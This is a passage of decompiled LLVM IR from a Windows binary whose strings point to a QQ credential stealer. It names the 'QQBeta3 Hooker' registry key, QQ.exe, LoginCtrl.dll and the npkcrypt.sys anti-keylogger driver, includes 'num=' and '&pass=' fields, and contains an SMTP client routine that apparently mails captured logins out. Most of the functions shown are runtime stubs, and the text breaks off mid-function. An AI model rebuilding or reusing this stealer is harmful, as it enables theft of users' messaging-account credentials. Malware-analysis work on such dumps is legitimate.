source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_404c5c = local_unnamed_addr constant i32 43
@global_var_404c74 = constant i32 37
@global_var_404cfc = local_unnamed_addr constant i32 63
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_404dc0 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_404dc4 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4080f8 = global i32 1
@global_var_404de0 = constant [10 x i8] c"First Run\00"
@global_var_404e9c = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_404eb8 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213024
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4212956
@global_var_4080dc = local_unnamed_addr global i32 4212820
@global_var_4080f0 = global i32 4230401
@global_var_404f64 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_404f74 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_405238 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4212752
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 4215688
@B64EncodeTable_at_405388 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405a60 = constant [6 x i8] c"HELO \00"
@global_var_405a70 = constant [3 x i8] c"\0D\0A\00"
@global_var_405a7c = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405a94 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405aac = constant i32 62
@global_var_405ab8 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405acc = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_405adc = constant [8 x i8] c"From: <\00"
@global_var_405aec = constant [6 x i8] c"To: <\00"
@global_var_405afc = constant [10 x i8] c"Subject: \00"
@global_var_405b10 = constant i32 46
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_405b1c = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_405b66 = local_unnamed_addr constant i32 763609949
@global_var_405c88 = constant [7 x i8] c"#32770\00"
@global_var_405c98 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_405ce4 = local_unnamed_addr constant i32 4218088
@global_var_405ce8 = local_unnamed_addr constant i32 841875985
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_408100 = local_unnamed_addr global i32 4218380
@global_var_405e0c = local_unnamed_addr constant [7 x i8] c"aaapif\00"
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_406008 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408104 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408108 = local_unnamed_addr global i32 0
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213092
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_406320 = constant [6 x i8] c"Down(\00"
@global_var_406330 = constant i32 41
@global_var_40633c = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_406340 = constant [5 x i8] c"Open\00"
@global_var_4096d0 = global i32 0
@global_var_4065ac = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212888
@global_var_4065b8 = constant i32 47
@global_var_4065f8 = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_406604 = constant [5 x i8] c"num=\00"
@global_var_406614 = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_4066d0 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_4066e0 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4067f0 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406800 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_406808 = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_4096dc = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_406a7c = local_unnamed_addr constant [11 x i8] c"xiaran.obj\00"
@global_var_406a90 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_406a9c = local_unnamed_addr constant i32 47
@global_var_406888 = local_unnamed_addr constant i32 4221068
@global_var_40688c = local_unnamed_addr constant i32 841875985
@global_var_406bbc = local_unnamed_addr constant [10 x i8] c"rejoi.obj\00"
@global_var_406bd0 = constant i32 47
@global_var_406bdc = constant [3 x i8] c"\0D\0A\00"
@global_var_4096d8 = local_unnamed_addr global i32 0
@global_var_4071b4 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_407260 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_4073e8 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_4073f4 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096d0
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_4096ec = local_unnamed_addr global i32 0
@global_var_4096f0 = local_unnamed_addr global i32 0
@global_var_40810c = local_unnamed_addr global i32 0
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_4078d4 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_4078f8 = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_40798c = constant [11 x i8] c"user32.dll\00"
@global_var_407998 = constant [11 x i8] c"LoadImageA\00"
@global_var_4079a4 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_407584 = local_unnamed_addr constant i32 4224464
@global_var_4075d0 = local_unnamed_addr constant i32 1867011080
@global_var_4079b4 = constant [12 x i8] c"LoadStringA\00"
@global_var_4079c0 = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_4079cc = constant [12 x i8] c"shell32.dll\00"
@global_var_4079d8 = constant [14 x i8] c"ShellExecuteA\00"
@global_var_4079e8 = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_40810d = local_unnamed_addr global i32 0
@global_var_4096f4 = local_unnamed_addr global i32 0
@global_var_407a84 = local_unnamed_addr constant i32 30
@global_var_409804 = local_unnamed_addr global i32 0
@global_var_407e24 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_409800 = local_unnamed_addr global i32 0
@global_var_407e34 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407e4c = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_407e64 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407e74 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407e84 = constant [8 x i8] c"ListBox\00"
@global_var_409808 = global i32 0
@global_var_407e94 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_4096f8 = external global i8*

declare i32 @unknown_4e40() local_unnamed_addr

declare i32 @unknown_4f18() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
  store i32 %5, i32* %3, align 4, !insn.addr !85
